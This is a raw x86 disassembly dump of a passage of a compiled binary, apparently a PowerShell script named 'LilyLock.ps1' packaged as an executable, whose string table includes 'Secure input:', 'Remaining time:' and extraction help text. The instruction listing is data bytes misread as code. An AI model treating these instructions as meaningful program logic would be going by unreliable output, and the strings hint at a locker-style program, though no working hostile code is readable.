  409148:	31 00                	xor    %eax,(%eax)
  40914a:	61                   	popa
  40914b:	64 64 5f             	fs fs pop %edi
  40914e:	44                   	inc    %esp
  40914f:	61                   	popa
  409150:	74 61                	je     0x4091b3
  409152:	41                   	inc    %ecx
  409153:	64 64 65 64 00 43 6f 	fs fs gs add %al,%fs:0x6f(%ebx)
  40915a:	6d                   	insl   (%dx),%es:(%edi)
  40915b:	70 6c                	jo     0x4091c9
  40915d:	65 74 65             	gs je  0x4091c5
  409160:	00 43 6f             	add    %al,0x6f(%ebx)
  409163:	6d                   	insl   (%dx),%es:(%edi)
  409164:	70 61                	jo     0x4091c7
  409166:	72 65                	jb     0x4091cd
  409168:	00 53 74             	add    %dl,0x74(%ebx)
  40916b:	72 69                	jb     0x4091d6
  40916d:	6e                   	outsb  %ds:(%esi),(%dx)
  40916e:	67 43                	addr16 inc %ebx
  409170:	6f                   	outsl  %ds:(%esi),(%dx)
  409171:	6d                   	insl   (%dx),%es:(%edi)
  409172:	70 61                	jo     0x4091d5
  409174:	72 69                	jb     0x4091df
  409176:	73 6f                	jae    0x4091e7
  409178:	6e                   	outsb  %ds:(%esi),(%dx)
  409179:	00 53 74             	add    %dl,0x74(%ebx)
  40917c:	61                   	popa
  40917d:	72 74                	jb     0x4091f3
  40917f:	73 57                	jae    0x4091d8
  409181:	69 74 68 00 53 74 72 	imul   $0x69727453,0x0(%eax,%ebp,2),%esi
  409188:	69 
  409189:	6e                   	outsb  %ds:(%esi),(%dx)
  40918a:	67 53                	addr16 push %ebx
  40918c:	70 6c                	jo     0x4091fa
  40918e:	69 74 4f 70 74 69 6f 	imul   $0x6e6f6974,0x70(%edi,%ecx,2),%esi
  409195:	6e 
  409196:	73 00                	jae    0x409198
  409198:	53                   	push   %ebx
  409199:	70 6c                	jo     0x409207
  40919b:	69 74 00 4d 65 73 73 	imul   $0x61737365,0x4d(%eax,%eax,1),%esi
  4091a2:	61 
  4091a3:	67 65 42             	addr16 gs inc %edx
  4091a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4091a7:	78 42                	js     0x4091eb
  4091a9:	75 74                	jne    0x40921f
  4091ab:	74 6f                	je     0x40921c
  4091ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4091ae:	73 00                	jae    0x4091b0
  4091b0:	4d                   	dec    %ebp
  4091b1:	65 73 73             	gs jae 0x409227
  4091b4:	61                   	popa
  4091b5:	67 65 42             	addr16 gs inc %edx
  4091b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4091b9:	78 49                	js     0x409204
  4091bb:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4091be:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4091c2:	6d                   	insl   (%dx),%es:(%edi)
  4091c3:	00 53 79             	add    %dl,0x79(%ebx)
  4091c6:	73 74                	jae    0x40923c
  4091c8:	65 6d                	gs insl (%dx),%es:(%edi)
  4091ca:	2e 44                	cs inc %esp
  4091cc:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4091d3:	69 63 73 00 44 65 62 	imul   $0x62654400,0x73(%ebx),%esp
  4091da:	75 67                	jne    0x409243
  4091dc:	67 65 72 00          	addr16 gs jb 0x4091e0
  4091e0:	4c                   	dec    %esp
  4091e1:	61                   	popa
  4091e2:	75 6e                	jne    0x409252
  4091e4:	63 68 00             	arpl   %ebp,0x0(%eax)
  4091e7:	53                   	push   %ebx
  4091e8:	79 73                	jns    0x40925d
  4091ea:	74 65                	je     0x409251
  4091ec:	6d                   	insl   (%dx),%es:(%edi)
  4091ed:	2e 49                	cs dec %ecx
  4091ef:	4f                   	dec    %edi
  4091f0:	00 53 74             	add    %dl,0x74(%ebx)
  4091f3:	72 65                	jb     0x40925a
  4091f5:	61                   	popa
  4091f6:	6d                   	insl   (%dx),%es:(%edi)
  4091f7:	00 47 65             	add    %al,0x65(%edi)
  4091fa:	74 4d                	je     0x409249
  4091fc:	61                   	popa
  4091fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4091fe:	69 66 65 73 74 52 65 	imul   $0x65527473,0x65(%esi),%esp
  409205:	73 6f                	jae    0x409276
  409207:	75 72                	jne    0x40927b
  409209:	63 65 53             	arpl   %esp,0x53(%ebp)
  40920c:	74 72                	je     0x409280
  40920e:	65 61                	gs popa
  409210:	6d                   	insl   (%dx),%es:(%edi)
  409211:	00 45 6e             	add    %al,0x6e(%ebp)
  409214:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409217:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40921e:	5f                   	pop    %edi
  40921f:	55                   	push   %ebp
  409220:	54                   	push   %esp
  409221:	46                   	inc    %esi
  409222:	38 00                	cmp    %al,(%eax)
  409224:	53                   	push   %ebx
  409225:	74 72                	je     0x409299
  409227:	65 61                	gs popa
  409229:	6d                   	insl   (%dx),%es:(%edi)
  40922a:	52                   	push   %edx
  40922b:	65 61                	gs popa
  40922d:	64 65 72 00          	fs gs jb 0x409231
  409231:	54                   	push   %esp
  409232:	65 78 74             	gs js  0x4092a9
  409235:	52                   	push   %edx
  409236:	65 61                	gs popa
  409238:	64 65 72 00          	fs gs jb 0x40923c
  40923c:	52                   	push   %edx
  40923d:	65 61                	gs popa
  40923f:	64 54                	fs push %esp
  409241:	6f                   	outsl  %ds:(%esi),(%dx)
  409242:	45                   	inc    %ebp
  409243:	6e                   	outsb  %ds:(%esi),(%dx)
  409244:	64 00 46 69          	add    %al,%fs:0x69(%esi)
  409248:	6c                   	insb   (%dx),%es:(%edi)
  409249:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  40924d:	69 74 65 41 6c 6c 54 	imul   $0x65546c6c,0x41(%ebp,%eiz,2),%esi
  409254:	65 
  409255:	78 74                	js     0x4092cb
  409257:	00 41 64             	add    %al,0x64(%ecx)
  40925a:	64 53                	fs push %ebx
  40925c:	63 72 69             	arpl   %esi,0x69(%edx)
  40925f:	70 74                	jo     0x4092d5
  409261:	00 53 79             	add    %dl,0x79(%ebx)
  409264:	73 74                	jae    0x4092da
  409266:	65 6d                	gs insl (%dx),%es:(%edi)
  409268:	2e 54                	cs push %esp
  40926a:	65 78 74             	gs js  0x4092e1
  40926d:	2e 52                	cs push %edx
  40926f:	65 67 75 6c          	gs addr16 jne 0x4092df
  409273:	61                   	popa
  409274:	72 45                	jb     0x4092bb
  409276:	78 70                	js     0x4092e8
  409278:	72 65                	jb     0x4092df
  40927a:	73 73                	jae    0x4092ef
  40927c:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  409283:	67 65 78 00          	addr16 gs js 0x409287
  409287:	4d                   	dec    %ebp
  409288:	61                   	popa
  409289:	74 63                	je     0x4092ee
  40928b:	68 00 47 72 6f       	push   $0x6f724700
  409290:	75 70                	jne    0x409302
  409292:	00 67 65             	add    %ah,0x65(%edi)
  409295:	74 5f                	je     0x4092f6
  409297:	53                   	push   %ebx
  409298:	75 63                	jne    0x4092fd
  40929a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40929d:	73 00                	jae    0x40929f
  40929f:	47                   	inc    %edi
  4092a0:	72 6f                	jb     0x409311
  4092a2:	75 70                	jne    0x409314
  4092a4:	43                   	inc    %ebx
  4092a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4092a6:	6c                   	insb   (%dx),%es:(%edi)
  4092a7:	6c                   	insb   (%dx),%es:(%edi)
  4092a8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4092ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4092ae:	00 67 65             	add    %ah,0x65(%edi)
  4092b1:	74 5f                	je     0x409312
  4092b3:	47                   	inc    %edi
  4092b4:	72 6f                	jb     0x409325
  4092b6:	75 70                	jne    0x409328
  4092b8:	73 00                	jae    0x4092ba
  4092ba:	44                   	inc    %esp
  4092bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4092bc:	75 62                	jne    0x409320
  4092be:	6c                   	insb   (%dx),%es:(%edi)
  4092bf:	65 00 54 72 79       	add    %dl,%gs:0x79(%edx,%esi,2)
  4092c4:	50                   	push   %eax
  4092c5:	61                   	popa
  4092c6:	72 73                	jb     0x40933b
  4092c8:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  4092cc:	64 50                	fs push %eax
  4092ce:	61                   	popa
  4092cf:	72 61                	jb     0x409332
  4092d1:	6d                   	insl   (%dx),%es:(%edi)
  4092d2:	65 74 65             	gs je  0x40933a
  4092d5:	72 00                	jb     0x4092d7
  4092d7:	43                   	inc    %ebx
  4092d8:	61                   	popa
  4092d9:	70 74                	jo     0x40934f
  4092db:	75 72                	jne    0x40934f
  4092dd:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4092e1:	74 5f                	je     0x409342
  4092e3:	56                   	push   %esi
  4092e4:	61                   	popa
  4092e5:	6c                   	insb   (%dx),%es:(%edi)
  4092e6:	75 65                	jne    0x40934d
  4092e8:	00 54 6f 55          	add    %dl,0x55(%edi,%ebp,2)
  4092ec:	70 70                	jo     0x40935e
  4092ee:	65 72 00             	gs jb  0x4092f1
  4092f1:	42                   	inc    %edx
  4092f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4092f4:	6c                   	insb   (%dx),%es:(%edi)
  4092f5:	65 61                	gs popa
  4092f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4092f8:	00 41 64             	add    %al,0x64(%ecx)
  4092fb:	64 41                	fs inc %ecx
  4092fd:	72 67                	jb     0x409366
  4092ff:	75 6d                	jne    0x40936e
  409301:	65 6e                	outsb  %gs:(%esi),(%dx)
  409303:	74 00                	je     0x409305
  409305:	41                   	inc    %ecx
  409306:	64 64 43             	fs fs inc %ebx
  409309:	6f                   	outsl  %ds:(%esi),(%dx)
  40930a:	6d                   	insl   (%dx),%es:(%edi)
  40930b:	6d                   	insl   (%dx),%es:(%edi)
  40930c:	61                   	popa
  40930d:	6e                   	outsb  %ds:(%esi),(%dx)
  40930e:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  409312:	79 6e                	jns    0x409382
  409314:	63 43 61             	arpl   %eax,0x61(%ebx)
  409317:	6c                   	insb   (%dx),%es:(%edi)
  409318:	6c                   	insb   (%dx),%es:(%edi)
  409319:	62 61 63             	bound  %esp,0x63(%ecx)
  40931c:	6b 00 50             	imul   $0x50,(%eax),%eax
  40931f:	53                   	push   %ebx
  409320:	49                   	dec    %ecx
  409321:	6e                   	outsb  %ds:(%esi),(%dx)
  409322:	76 6f                	jbe    0x409393
  409324:	63 61 74             	arpl   %esp,0x74(%ecx)
  409327:	69 6f 6e 53 65 74 74 	imul   $0x74746553,0x6e(%edi),%ebp
  40932e:	69 6e 67 73 00 42 65 	imul   $0x65420073,0x67(%esi),%ebp
  409335:	67 69 6e 49 6e 76 6f 	imul   $0x6b6f766e,0x49(%bp),%ebp
  40933c:	6b 
  40933d:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  409341:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  409348:	65 
  409349:	00 57 61             	add    %dl,0x61(%edi)
  40934c:	69 74 4f 6e 65 00 50 	imul   $0x53500065,0x6e(%edi,%ecx,2),%esi
  409353:	53 
  409354:	49                   	dec    %ecx
  409355:	6e                   	outsb  %ds:(%esi),(%dx)
  409356:	76 6f                	jbe    0x4093c7
  409358:	63 61 74             	arpl   %esp,0x74(%ecx)
  40935b:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  409362:	65 49                	gs dec %ecx
  409364:	6e                   	outsb  %ds:(%esi),(%dx)
  409365:	66 6f                	outsw  %ds:(%esi),(%dx)
  409367:	00 67 65             	add    %ah,0x65(%edi)
  40936a:	74 5f                	je     0x4093cb
  40936c:	49                   	dec    %ecx
  40936d:	6e                   	outsb  %ds:(%esi),(%dx)
  40936e:	76 6f                	jbe    0x4093df
  409370:	63 61 74             	arpl   %esp,0x74(%ecx)
  409373:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  40937a:	65 49                	gs dec %ecx
  40937c:	6e                   	outsb  %ds:(%esi),(%dx)
  40937d:	66 6f                	outsw  %ds:(%esi),(%dx)
  40937f:	00 50 53             	add    %dl,0x53(%eax)
  409382:	49                   	dec    %ecx
  409383:	6e                   	outsb  %ds:(%esi),(%dx)
  409384:	76 6f                	jbe    0x4093f5
  409386:	63 61 74             	arpl   %esp,0x74(%ecx)
  409389:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  409390:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  409394:	74 5f                	je     0x4093f5
  409396:	53                   	push   %ebx
  409397:	74 61                	je     0x4093fa
  409399:	74 65                	je     0x409400
  40939b:	00 67 65             	add    %ah,0x65(%edi)
  40939e:	74 5f                	je     0x4093ff
  4093a0:	52                   	push   %edx
  4093a1:	65 61                	gs popa
  4093a3:	73 6f                	jae    0x409414
  4093a5:	6e                   	outsb  %ds:(%esi),(%dx)
  4093a6:	00 43 6f             	add    %al,0x6f(%ebx)
  4093a9:	6d                   	insl   (%dx),%es:(%edi)
  4093aa:	70 69                	jo     0x409415
  4093ac:	6c                   	insb   (%dx),%es:(%edi)
  4093ad:	65 72 47             	gs jb  0x4093f7
  4093b0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4093b2:	65 72 61             	gs jb  0x409416
  4093b5:	74 65                	je     0x40941c
  4093b7:	64 41                	fs inc %ecx
  4093b9:	74 74                	je     0x40942f
  4093bb:	72 69                	jb     0x409426
  4093bd:	62 75 74             	bound  %esi,0x74(%ebp)
  4093c0:	65 00 4c 69 6c       	add    %cl,%gs:0x6c(%ecx,%ebp,2)
  4093c5:	79 4c                	jns    0x409413
  4093c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4093c8:	63 6b 2e             	arpl   %ebp,0x2e(%ebx)
  4093cb:	70 73                	jo     0x409440
  4093cd:	31 00                	xor    %eax,(%eax)
  4093cf:	00 00                	add    %al,(%eax)
  4093d1:	01 00                	add    %eax,(%eax)
  4093d3:	21 53 00             	and    %edx,0x0(%ebx)
  4093d6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4093da:	75 00                	jne    0x4093dc
  4093dc:	72 00                	jb     0x4093de
  4093de:	65 00 20             	add    %ah,%gs:(%eax)
  4093e1:	00 69 00             	add    %ch,0x0(%ecx)
  4093e4:	6e                   	outsb  %ds:(%esi),(%dx)
  4093e5:	00 70 00             	add    %dh,0x0(%eax)
  4093e8:	75 00                	jne    0x4093ea
  4093ea:	74 00                	je     0x4093ec
  4093ec:	3a 00                	cmp    (%eax),%al
  4093ee:	20 00                	and    %al,(%eax)
  4093f0:	20 00                	and    %al,(%eax)
  4093f2:	20 00                	and    %al,(%eax)
  4093f4:	00 21                	add    %ah,(%ecx)
  4093f6:	49                   	dec    %ecx
  4093f7:	00 6e 00             	add    %ch,0x0(%esi)
  4093fa:	70 00                	jo     0x4093fc
  4093fc:	75 00                	jne    0x4093fe
  4093fe:	74 00                	je     0x409400
  409400:	3a 00                	cmp    (%eax),%al
  409402:	20 00                	and    %al,(%eax)
  409404:	20 00                	and    %al,(%eax)
  409406:	20 00                	and    %al,(%eax)
  409408:	20 00                	and    %al,(%eax)
  40940a:	20 00                	and    %al,(%eax)
  40940c:	20 00                	and    %al,(%eax)
  40940e:	20 00                	and    %al,(%eax)
  409410:	20 00                	and    %al,(%eax)
  409412:	20 00                	and    %al,(%eax)
  409414:	20 00                	and    %al,(%eax)
  409416:	00 05 4f 00 4b 00    	add    %al,0x4b004f
  40941c:	00 0d 43 00 61 00    	add    %cl,0x610043
  409422:	6e                   	outsb  %ds:(%esi),(%dx)
  409423:	00 63 00             	add    %ah,0x0(%ebx)
  409426:	65 00 6c 00 00       	add    %ch,%gs:0x0(%eax,%eax,1)
  40942b:	03 00                	add    (%eax),%eax
  40942d:	00 01                	add    %al,(%ecx)
  40942f:	17                   	pop    %ss
  409430:	50                   	push   %eax
  409431:	00 72 00             	add    %dh,0x0(%edx)
  409434:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409438:	73 00                	jae    0x40943a
  40943a:	20 00                	and    %al,(%eax)
  40943c:	61                   	popa
  40943d:	00 20                	add    %ah,(%eax)
  40943f:	00 6b 00             	add    %ch,0x0(%ebx)
  409442:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  409446:	00 0f                	add    %cl,(%edi)
  409448:	23 00                	and    (%eax),%eax
  40944a:	30 00                	xor    %al,(%eax)
  40944c:	30 00                	xor    %al,(%eax)
  40944e:	30 00                	xor    %al,(%eax)
  409450:	30 00                	xor    %al,(%eax)
  409452:	38 00                	cmp    %al,(%eax)
  409454:	30 00                	xor    %al,(%eax)
  409456:	00 0f                	add    %cl,(%edi)
  409458:	23 00                	and    (%eax),%eax
  40945a:	38 00                	cmp    %al,(%eax)
  40945c:	30 00                	xor    %al,(%eax)
  40945e:	38 00                	cmp    %al,(%eax)
  409460:	30 00                	xor    %al,(%eax)
  409462:	38 00                	cmp    %al,(%eax)
  409464:	30 00                	xor    %al,(%eax)
  409466:	00 0f                	add    %cl,(%edi)
  409468:	23 00                	and    (%eax),%eax
  40946a:	30 00                	xor    %al,(%eax)
  40946c:	30 00                	xor    %al,(%eax)
  40946e:	38 00                	cmp    %al,(%eax)
  409470:	30 00                	xor    %al,(%eax)
  409472:	30 00                	xor    %al,(%eax)
  409474:	30 00                	xor    %al,(%eax)
  409476:	00 0f                	add    %cl,(%edi)
  409478:	23 00                	and    (%eax),%eax
  40947a:	30 00                	xor    %al,(%eax)
  40947c:	30 00                	xor    %al,(%eax)
  40947e:	38 00                	cmp    %al,(%eax)
  409480:	30 00                	xor    %al,(%eax)
  409482:	38 00                	cmp    %al,(%eax)
  409484:	30 00                	xor    %al,(%eax)
  409486:	00 0f                	add    %cl,(%edi)
  409488:	23 00                	and    (%eax),%eax
  40948a:	38 00                	cmp    %al,(%eax)
  40948c:	30 00                	xor    %al,(%eax)
  40948e:	30 00                	xor    %al,(%eax)
  409490:	30 00                	xor    %al,(%eax)
  409492:	38 00                	cmp    %al,(%eax)
  409494:	30 00                	xor    %al,(%eax)
  409496:	00 0f                	add    %cl,(%edi)
  409498:	23 00                	and    (%eax),%eax
  40949a:	38 00                	cmp    %al,(%eax)
  40949c:	30 00                	xor    %al,(%eax)
  40949e:	30 00                	xor    %al,(%eax)
  4094a0:	30 00                	xor    %al,(%eax)
  4094a2:	30 00                	xor    %al,(%eax)
  4094a4:	30 00                	xor    %al,(%eax)
  4094a6:	00 0f                	add    %cl,(%edi)
  4094a8:	23 00                	and    (%eax),%eax
  4094aa:	38 00                	cmp    %al,(%eax)
  4094ac:	30 00                	xor    %al,(%eax)
  4094ae:	38 00                	cmp    %al,(%eax)
  4094b0:	30 00                	xor    %al,(%eax)
  4094b2:	30 00                	xor    %al,(%eax)
  4094b4:	30 00                	xor    %al,(%eax)
  4094b6:	00 0f                	add    %cl,(%edi)
  4094b8:	23 00                	and    (%eax),%eax
  4094ba:	43                   	inc    %ebx
  4094bb:	00 30                	add    %dh,(%eax)
  4094bd:	00 43 00             	add    %al,0x0(%ebx)
  4094c0:	30 00                	xor    %al,(%eax)
  4094c2:	43                   	inc    %ebx
  4094c3:	00 30                	add    %dh,(%eax)
  4094c5:	00 00                	add    %al,(%eax)
  4094c7:	0f 23 00             	mov    %eax,%db0
  4094ca:	30 00                	xor    %al,(%eax)
  4094cc:	30 00                	xor    %al,(%eax)
  4094ce:	46                   	inc    %esi
  4094cf:	00 46 00             	add    %al,0x0(%esi)
  4094d2:	30 00                	xor    %al,(%eax)
  4094d4:	30 00                	xor    %al,(%eax)
  4094d6:	00 21                	add    %ah,(%ecx)
  4094d8:	52                   	push   %edx
  4094d9:	00 65 00             	add    %ah,0x0(%ebp)
  4094dc:	6d                   	insl   (%dx),%es:(%edi)
  4094dd:	00 61 00             	add    %ah,0x0(%ecx)
  4094e0:	69 00 6e 00 69 00    	imul   $0x69006e,(%eax),%eax
  4094e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4094e7:	00 67 00             	add    %ah,0x0(%edi)
  4094ea:	20 00                	and    %al,(%eax)
  4094ec:	74 00                	je     0x4094ee
  4094ee:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  4094f4:	3a 00                	cmp    (%eax),%al
  4094f6:	20 00                	and    %al,(%eax)
  4094f8:	00 29                	add    %ch,(%ecx)
  4094fa:	7b 00                	jnp    0x4094fc
  4094fc:	30 00                	xor    %al,(%eax)
  4094fe:	3a 00                	cmp    (%eax),%al
  409500:	30 00                	xor    %al,(%eax)
  409502:	30 00                	xor    %al,(%eax)
  409504:	7d 00                	jge    0x409506
  409506:	3a 00                	cmp    (%eax),%al
  409508:	7b 00                	jnp    0x40950a
  40950a:	31 00                	xor    %eax,(%eax)
  40950c:	3a 00                	cmp    (%eax),%al
  40950e:	30 00                	xor    %al,(%eax)
  409510:	30 00                	xor    %al,(%eax)
  409512:	7d 00                	jge    0x409514
  409514:	3a 00                	cmp    (%eax),%al
  409516:	7b 00                	jnp    0x409518
  409518:	32 00                	xor    (%eax),%al
  40951a:	3a 00                	cmp    (%eax),%al
  40951c:	30 00                	xor    %al,(%eax)
  40951e:	30 00                	xor    %al,(%eax)
  409520:	7d 00                	jge    0x409522
  409522:	00 3f                	add    %bh,(%edi)
  409524:	53                   	push   %ebx
  409525:	00 79 00             	add    %bh,0x0(%ecx)
  409528:	73 00                	jae    0x40952a
  40952a:	74 00                	je     0x40952c
  40952c:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409530:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  409534:	6f                   	outsl  %ds:(%esi),(%dx)
  409535:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409539:	00 65 00             	add    %ah,0x0(%ebp)
  40953c:	63 00                	arpl   %eax,(%eax)
  40953e:	74 00                	je     0x409540
  409540:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  409546:	73 00                	jae    0x409548
  409548:	2e 00 47 00          	add    %al,%cs:0x0(%edi)
  40954c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409550:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409554:	69 00 63 00 2e 00    	imul   $0x2e0063,(%eax),%eax
  40955a:	4c                   	dec    %esp
  40955b:	00 69 00             	add    %ch,0x0(%ecx)
  40955e:	73 00                	jae    0x409560
  409560:	74 00                	je     0x409562
  409562:	00 03                	add    %al,(%ebx)
  409564:	31 00                	xor    %eax,(%eax)
  409566:	00 15 7b 00 30 00    	add    %dl,0x30007b
  40956c:	7d 00                	jge    0x40956e
  40956e:	5b                   	pop    %ebx
  40956f:	00 7b 00             	add    %bh,0x0(%ebx)
  409572:	31 00                	xor    %eax,(%eax)
  409574:	7d 00                	jge    0x409576
  409576:	5d                   	pop    %ebp
  409577:	00 3a                	add    %bh,(%edx)
  409579:	00 20                	add    %ah,(%eax)
  40957b:	00 00                	add    %al,(%eax)
  40957d:	07                   	pop    %es
  40957e:	41                   	inc    %ecx
  40957f:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  409583:	00 00                	add    %al,(%eax)
  409585:	0f 54 00             	andps  (%eax),%xmm0
  409588:	6f                   	outsl  %ds:(%esi),(%dx)
  409589:	00 41 00             	add    %al,0x0(%ecx)
  40958c:	72 00                	jb     0x40958e
  40958e:	72 00                	jb     0x409590
  409590:	61                   	popa
  409591:	00 79 00             	add    %bh,0x0(%ecx)
  409594:	00 0b                	add    %cl,(%ebx)
  409596:	7b 00                	jnp    0x409598
  409598:	30 00                	xor    %al,(%eax)
  40959a:	7d 00                	jge    0x40959c
  40959c:	3a 00                	cmp    (%eax),%al
  40959e:	20 00                	and    %al,(%eax)
  4095a0:	00 29                	add    %ch,(%ecx)
  4095a2:	0a 00                	or     (%eax),%al
  4095a4:	28 00                	sub    %al,(%eax)
  4095a6:	54                   	push   %esp
  4095a7:	00 79 00             	add    %bh,0x0(%ecx)
  4095aa:	70 00                	jo     0x4095ac
  4095ac:	65 00 20             	add    %ah,%gs:(%eax)
  4095af:	00 21                	add    %ah,(%ecx)
  4095b1:	00 3f                	add    %bh,(%edi)
  4095b3:	00 20                	add    %ah,(%eax)
  4095b5:	00 66 00             	add    %ah,0x0(%esi)
  4095b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4095b9:	00 72 00             	add    %dh,0x0(%edx)
  4095bc:	20 00                	and    %al,(%eax)
  4095be:	68 00 65 00 6c       	push   $0x6c006500
  4095c3:	00 70 00             	add    %dh,0x0(%eax)
  4095c6:	2e 00 29             	add    %ch,%cs:(%ecx)
  4095c9:	00 00                	add    %al,(%eax)
  4095cb:	05 21 00 3f 00       	add    $0x3f0021,%eax
  4095d0:	00 47 57             	add    %al,0x57(%edi)
  4095d3:	00 72 00             	add    %dh,0x0(%edx)
  4095d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4095d7:	00 6e 00             	add    %ch,0x0(%esi)
  4095da:	67 00 20             	add    %ah,(%bx,%si)
  4095dd:	00 66 00             	add    %ah,0x0(%esi)
  4095e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4095e1:	00 72 00             	add    %dh,0x0(%edx)
  4095e4:	6d                   	insl   (%dx),%es:(%edi)
  4095e5:	00 61 00             	add    %ah,0x0(%ecx)
  4095e8:	74 00                	je     0x4095ea
  4095ea:	2c 00                	sub    $0x0,%al
  4095ec:	20 00                	and    %al,(%eax)
  4095ee:	70 00                	jo     0x4095f0
  4095f0:	6c                   	insb   (%dx),%es:(%edi)
  4095f1:	00 65 00             	add    %ah,0x0(%ebp)
  4095f4:	61                   	popa
  4095f5:	00 73 00             	add    %dh,0x0(%ebx)
  4095f8:	65 00 20             	add    %ah,%gs:(%eax)
  4095fb:	00 72 00             	add    %dh,0x0(%edx)
  4095fe:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  409602:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  409606:	74 00                	je     0x409608
  409608:	20 00                	and    %al,(%eax)
  40960a:	69 00 6e 00 70 00    	imul   $0x70006e,(%eax),%eax
  409610:	75 00                	jne    0x409612
  409612:	74 00                	je     0x409614
  409614:	3a 00                	cmp    (%eax),%al
  409616:	20 00                	and    %al,(%eax)
  409618:	00 07                	add    %al,(%edi)
  40961a:	08 00                	or     %al,(%eax)
  40961c:	20 00                	and    %al,(%eax)
  40961e:	08 00                	or     %al,(%eax)
  409620:	01 03                	add    %eax,(%ebx)
  409622:	2a 00                	sub    (%eax),%al
  409624:	00 1f                	add    %bl,(%edi)
  409626:	50                   	push   %eax
  409627:	00 53 00             	add    %dl,0x0(%ebx)
  40962a:	52                   	push   %edx
  40962b:	00 75 00             	add    %dh,0x0(%ebp)
  40962e:	6e                   	outsb  %ds:(%esi),(%dx)
  40962f:	00 73 00             	add    %dh,0x0(%ebx)
  409632:	70 00                	jo     0x409634
  409634:	61                   	popa
  409635:	00 63 00             	add    %ah,0x0(%ebx)
  409638:	65 00 2d 00 48 00 6f 	add    %ch,%gs:0x6f004800
  40963f:	00 73 00             	add    %dh,0x0(%ebx)
  409642:	74 00                	je     0x409644
  409644:	01 05 75 00 69 00    	add    %eax,0x690075
  40964a:	00 0b                	add    %cl,(%ebx)
  40964c:	2d 00 77 00 61       	sub    $0x61007700,%eax
  409651:	00 69 00             	add    %ch,0x0(%ecx)
  409654:	74 00                	je     0x409656
  409656:	01 11                	add    %edx,(%ecx)
  409658:	2d 00 65 00 78       	sub    $0x78006500,%eax
  40965d:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  409661:	00 61 00             	add    %ah,0x0(%ecx)
  409664:	63 00                	arpl   %eax,(%eax)
  409666:	74 00                	je     0x409668
  409668:	01 03                	add    %eax,(%ebx)
  40966a:	3a 00                	cmp    (%eax),%al
  40966c:	00 80 dd 49 00 66    	add    %al,0x660049dd(%eax)
  409672:	00 20                	add    %ah,(%eax)
  409674:	00 79 00             	add    %bh,0x0(%ecx)
  409677:	6f                   	outsl  %ds:(%esi),(%dx)
  409678:	00 75 00             	add    %dh,0x0(%ebp)
  40967b:	20 00                	and    %al,(%eax)
  40967d:	73 00                	jae    0x40967f
  40967f:	70 00                	jo     0x409681
  409681:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409685:	69 00 66 00 79 00    	imul   $0x790066,(%eax),%eax
  40968b:	20 00                	and    %al,(%eax)
  40968d:	74 00                	je     0x40968f
  40968f:	68 00 65 00 20       	push   $0x20006500
  409694:	00 2d 00 65 00 78    	add    %ch,0x78006500
  40969a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40969e:	00 61 00             	add    %ah,0x0(%ecx)
  4096a1:	63 00                	arpl   %eax,(%eax)
  4096a3:	74 00                	je     0x4096a5
  4096a5:	20 00                	and    %al,(%eax)
  4096a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4096a8:	00 70 00             	add    %dh,0x0(%eax)
  4096ab:	74 00                	je     0x4096ad
  4096ad:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4096b3:	20 00                	and    %al,(%eax)
  4096b5:	79 00                	jns    0x4096b7
  4096b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4096b8:	00 75 00             	add    %dh,0x0(%ebp)
  4096bb:	20 00                	and    %al,(%eax)
  4096bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4096be:	00 65 00             	add    %ah,0x0(%ebp)
